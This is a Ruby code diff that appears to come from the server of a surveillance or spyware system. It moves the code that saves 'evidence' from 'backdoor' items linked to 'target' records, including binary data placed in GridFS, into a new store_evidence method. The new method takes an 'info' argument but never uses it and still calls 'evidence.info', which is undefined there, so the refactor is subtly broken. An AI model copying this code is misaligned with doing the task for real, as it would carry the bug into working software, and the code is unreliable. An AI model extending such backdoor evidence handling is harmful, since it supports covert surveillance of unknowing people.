@@ -128,30 +128,13 @@ class InstanceProcessor
                   done = false
                   until done
                     begin
-                      # TODO: handle all the failure in saving the evidence in the db
 
-                      backdoor = ::Item.where({_kind: 'backdoor', _id: evidence.info[:backdoor]}).first
-                      target = ::Item.where({_kind: 'target', _id: backdoor[:_path].last}).first
+                      # save the evidence into the db
+                      store_evidence evidence.info
 
-                      ev = ::Evidence.dynamic_new target[:_id].to_s
-                      ev.acquired = evidence.info[:acquired].to_i
-                      ev.received = evidence.info[:received].to_i
-                      ev.type = evidence.info[:type]
-                      ev.relevance = 1
-                      ev.blotter = false
-                      ev.item = [ backdoor[:_id] ]
-
-                      ev.data = evidence.info[:data]
-
-                      # save the binary data
-                      unless evidence.info[:grid_content].nil?
-                        ev.data[:_grid_size] = evidence.info[:grid_content].bytesize
-                        ev.data[:_grid] = GridFS.instance.put(evidence.info[:grid_content], {filename: backdoor[:_id].to_s}) unless evidence.info[:grid_content].nil?
-                      end
-
-                      ev.save
-
+                      # then delete it from the sqlite repo
                       RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @id)
+
                       done = true
                     rescue Exception => e
                       trace :debug, "[#{@id}] UNRECOVERABLE ERROR [#{e.message}, #{e.class}]"
@@ -187,6 +170,31 @@ class InstanceProcessor
   def to_s
     "instance #{@id}: #{@evidences}"
   end
+
+  def store_evidence(info)
+
+    # retrieve the target and the dynamic collection for the evidence
+    backdoor = ::Item.where({_kind: 'backdoor', _id: evidence.info[:backdoor]}).first
+    target = ::Item.where({_kind: 'target', _id: backdoor[:_path].last}).first
+    ev = ::Evidence.dynamic_new target[:_id].to_s
+
+    ev.acquired = evidence.info[:acquired].to_i
+    ev.received = evidence.info[:received].to_i
+    ev.type = evidence.info[:type]
+    ev.relevance = 1
+    ev.blotter = false
+    ev.item = [ backdoor[:_id] ]
+    ev.data = evidence.info[:data]
+
+    # save the binary data (if any)
+    unless evidence.info[:grid_content].nil?
+      ev.data[:_grid_size] = evidence.info[:grid_content].bytesize
+      ev.data[:_grid] = GridFS.instance.put(evidence.info[:grid_content], {filename: backdoor[:_id].to_s}) unless evidence.info[:grid_content].nil?
+    end
+
+    ev.save
+  end
+
 end
 
 end # ::Worker
